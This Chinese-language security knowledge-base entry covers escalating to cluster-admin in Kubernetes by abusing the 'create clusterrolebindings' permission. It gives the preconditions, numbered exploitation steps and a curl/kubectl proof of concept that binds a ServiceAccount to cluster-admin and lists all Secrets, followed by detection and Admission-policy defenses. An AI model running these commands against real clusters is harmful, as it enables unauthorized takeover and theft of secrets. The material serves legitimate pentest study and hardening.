---
id: cloud-k8s-k8s-rbac-clusterrolebinding-privesc
title: 利用 create clusterrolebindings 权限绑定 cluster-admin 接管集群
type: scenario
domain: cloud
path: cloud/k8s
technique: k8s-rbac-clusterrolebinding-privesc
aliases:
- K8s RBAC 提权
- cluster-admin 绑定
- create clusterrolebindings
- ClusterRoleBinding 提权
tags:
- kubernetes
- rbac
- privilege-escalation
- clusterrolebinding
- cluster-admin
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V5
  verified_at: '2026-11-04T21:57:44+08:00'
  notes: 已补充 bind/403 分支并复核
---

## 一句话结论

当当前 ServiceAccount 同时拥有 `create clusterrolebindings`，且对目标 ClusterRole（如 `cluster-admin`）拥有 `bind` 权限或已拥有其全部权限时，攻击者可以创建一个把自身绑定到该角色的 ClusterRoleBinding，获得对应权限。仅有 `create` 而缺少 `bind`/全部权限时，apiserver 会返回 403 `cannot escalate to RBAC role`。

## 原理

- RBAC 中 `ClusterRoleBinding` 把某个主体（User/Group/ServiceAccount）绑定到 `ClusterRole`；`cluster-admin` 是内置的集群最高权限角色，拥有所有 API 资源的全部 verb。
- `create clusterrolebindings` 只是创建绑定的入口；Kubernetes RBAC 默认启用提权防护：创建者还必须对 `roleRef` 指向的 ClusterRole 拥有 `bind` 权限，或已经拥有该角色的全部权限，否则 apiserver 返回 403 `cannot escalate to RBAC role`。
- 绑定创建成功后，RBAC 授权器立即生效，不需要重启组件，也不需要等待；当前 Token 在下一次请求时就拥有 cluster-admin 权限。
- 这是一种“权限自授予”链：不需要窃取其他凭据，也不需要容器逃逸，单纯滥用 RBAC 写权限即可从命名空间内 SA 升级为集群管理员。
- 同类高危 verb 还有 `create rolebindings`（命名空间内提权）、`escalate`、`bind`、`impersonate`；`create clusterrolebindings` 是其中影响最直接的一种。

## 触发条件

- 当前 SA 拥有 `create` `clusterrolebindings`（`rbac.authorization.k8s.io` 组）权限。
- 对目标 ClusterRole 拥有 `bind` 权限，或已拥有该 ClusterRole 的全部权限；否则创建绑定会返回 403 `cannot escalate to RBAC role`。
- apiserver 可达且 Token 有效。
- 集群未通过 Admission 策略禁止创建绑定到 `cluster-admin` 的 ClusterRoleBinding。

## 利用步骤

1. 用 `SelfSubjectRulesReview` 或 `kubectl auth can-i create clusterrolebindings` 确认权限。
2. 用 `kubectl auth can-i bind clusterrole/cluster-admin` 或检查是否已拥有 `cluster-admin` 的全部权限；只有一次 `create` 权限时，下一步会 403。
3. 构造 ClusterRoleBinding，`subjects` 填当前 SA 的名称与命名空间，`roleRef` 指向 `cluster-admin`。
4. POST 到 `/apis/rbac.authorization.k8s.io/v1/clusterrolebindings`。
5. 返回 201 表示创建成功；403 `cannot escalate to RBAC role` 表示缺少 `bind` 或全部权限；409 表示同名绑定已存在，换一个名字重试。
6. 立即用同一 Token 验证：列出所有命名空间 Secret、创建 Pod、访问节点，确认已获得集群权限。
7. 清理或保留绑定取决于行动目的；绑定会持久化在 etcd 中，需有删除权限才能移除。

## PoC

```bash
# 确认权限
kubectl auth can-i create clusterrolebindings

# 创建绑定：把 default SA 绑到 cluster-admin
curl --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/yaml" \
  -X POST \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  -d '
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: test-privesc
subjects:
- kind: ServiceAccount
  name: default
  namespace: NAMESPACE
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
'

# 验证：列出所有命名空间的 Secret
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets
```

## 变体与关联

- 命名空间内提权：若有 `create rolebindings`，可绑定到命名空间内的高权限 Role（如能读 Secret、能建 Pod 的自定义 Role）。
- `escalate`/`bind`：允许修改 Role/ClusterRole 或创建绑定；`impersonate` 允许伪装成其他用户/SA，效果类似。
- 绑定目标不一定是 `cluster-admin`：任何高权限 ClusterRole（如 `system:masters` 相关角色、自定义全权限角色）都可作为目标。
- 关联：`[[cloud-k8s-k8s-pod-sa-token-rbac-enumeration]]` 是前置枚举；`[[cloud-k8s-k8s-rbac-secret-read]]` 是提权后的直接收益；`[[cloud-k8s-k8s-kubelet-unauth]]` 是另一种从节点侧获取权限的路径。

## 检测与防御

- 检测：审计日志中 `create clusterrolebindings`、`create rolebindings`、`escalate`、`bind`、`impersonate` 事件；重点关注绑定目标为 `cluster-admin` 或 `system:masters` 的请求。
- 检测：短时间内新建 ClusterRoleBinding 后，同一主体立即出现跨命名空间 Secret/Pod/Node 访问。
- 防御：默认不给业务 SA 任何 RBAC 写权限；对 `clusterrolebindings`、`clusterroles`、`rolebindings`、`roles` 的写操作只授予集群管理员。
- 防御：使用 Admission 策略（OPA Gatekeeper/Kyverno/ValidatingAdmissionPolicy）禁止创建绑定到 `cluster-admin` 的 ClusterRoleBinding，或限制可绑定的 Role 白名单。
- 加固：定期审计 RBAC 绑定，删除未使用的 ClusterRoleBinding；启用 API 审计并集中告警。
